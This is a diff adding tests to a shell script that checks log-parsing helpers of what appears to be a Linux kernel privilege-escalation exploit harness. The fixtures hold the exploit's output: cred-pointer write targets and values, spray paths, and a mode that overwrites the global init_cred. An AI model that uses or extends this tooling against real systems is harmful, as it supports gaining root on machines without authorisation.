@@ -112,6 +112,86 @@ stamp_ok 1 "$WT"; rc=$?
 [ "$rc" = 1 ] && ok "page written for T+0x780 does not satisfy T+0x778's stamp" \
               || bad "cross-page stamp matched -- the gate would pass a divergent pair"
 
+echo "=== 5. wv_from(): which page got installed ==="
+# This one is a silent no-op rather than a wrong verdict, but it is the same
+# class: run_w7 prints the write value on TWO lines and only one is
+# unconditional.  The old regex matched the spray path's wording only, so on
+# CONTROL=1 the extraction returned empty, `if [ -n "$CRED" ]` skipped the
+# repair, and the SV conjunction's own [ -n "$CRED" ] term made the launder gate
+# refuse -- with nothing anywhere reporting a problem.
+TF="./.wvtest.$$"
+trap 'rm -f "$TF"' EXIT
+
+# (a) spray path: both lines present, both agree
+cat > "$TF" <<'EOF'
+=== v12 W7[W7]: task=0xffffff8951a13780 cred@0x780 = private cred page ===
+W7[W7] write value = private cred page 0xffffff8785d6ade0 (+0 shape comp)
+W7[W7] write_target= 0xffffff8951a13f00
+W7[W7] write_value = 0xffffff8785d6ade0
+probe_state    = D
+EOF
+got=$(wv_from "$TF")
+[ "$got" = "0xffffff8785d6ade0" ] && ok "spray path      -> $got" \
+                                  || bad "spray path -> '$got', expected 0xffffff8785d6ade0"
+
+# (b) CONTROL=1: NO "private cred page" line at all -- the exact case that was
+#     silently dropped.  Real shape, out/t5_w7_778.txt.
+cat > "$TF" <<'EOF'
+W7[W7] ⚠ V12_ALLOW_INIT_CRED=1: writing the GLOBAL init_cred alias; init_cred+8 will be corrupted.
+W7[W7] write_target= 0xffffff8800cdd178
+W7[W7] write_value = 0xffffff802a7e0be0
+probe_state    = D
+EOF
+got=$(wv_from "$TF")
+[ "$got" = "0xffffff802a7e0be0" ] && ok "CONTROL=1 path  -> $got  (the case that used to be empty)" \
+                                  || bad "CONTROL=1 path -> '$got', expected 0xffffff802a7e0be0"
+
+# negative control: the OLD regex on the same CONTROL=1 file must return empty,
+# otherwise this test is not actually pinning the fix.
+old=$(grep -h -m1 'write value = private cred page' "$TF" 2>/dev/null \
+      | sed -n 's/.*page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
+[ -z "$old" ] && ok "old regex on CONTROL=1 -> empty (bug reproduced)" \
+              || bad "old regex returned '$old' -- the regression is not what we think"
+
+# (c) no write_value line at all -> empty, and the caller must treat that as
+#     "skip the repair", not as an address.
+printf 'W7[W7] REFUSED: no private cred page\n' > "$TF"
+got=$(wv_from "$TF")
+[ -z "$got" ] && ok "no write_value  -> empty (repair skipped, not a bogus address)" \
+              || bad "no write_value -> '$got', expected empty"
+
+# (d) several rounds: tail -1 must take the LAST, which is the successful one
+#     because shot_until returns the moment the stamp appears.
+cat > "$TF" <<'EOF'
+W7[W7] write_value = 0xffffff8700000001
+W7[W7] write_value = 0xffffff8700000002
+W7[W7] write_value = 0xffffff8700000003
+EOF
+got=$(wv_from "$TF")
+[ "$got" = "0xffffff8700000003" ] && ok "multi-round     -> $got (last == the landed round)" \
+                                  || bad "multi-round -> '$got', expected ...0003"
+
+# (e) wt_from(): the stamp criterion's INPUT.  Note the label has no space before
+#     `=` in the exploit's print ("write_target= 0x.."), unlike write_value's
+#     ("write_value = 0x..") -- a pattern that copied the other one would match
+#     nothing, and stamp_ok would then be fed an empty target and return
+#     UNREADABLE for every shot.
+cat > "$TF" <<'EOF'
+W7[W7] write value = private cred page 0xffffff8785d6ade0 (+0 shape comp)
+W7[W7] write_value = 0xffffff8785d6ade0
+W7[W7] write_target= 0xffffff8951a13f00
+EOF
+got=$(wt_from "$TF")
+[ "$got" = "0xffffff8951a13f00" ] && ok "wt_from         -> $got" \
+                                  || bad "wt_from -> '$got', expected 0xffffff8951a13f00"
+
+# and the round trip that matters: the extracted pair must satisfy the criterion
+UID_LINE="Uid: 0 0 $(( 0xffffff8951a13f00 >> 32 & 0xffffffff )) 0"
+GID_LINE="Gid: $(( 0xffffff8951a13f00 & 0xffffffff )) 0 0 0"
+stamp_ok 1 "$got"; rc=$?
+[ "$rc" = 0 ] && ok "wt_from -> stamp_ok round trip: rc=0 (the two agree)" \
+              || bad "wt_from -> stamp_ok round trip: rc=$rc, expected 0"
+
 echo
 echo "passed=$pass failed=$fail"
 [ "$fail" = 0 ] || exit 1
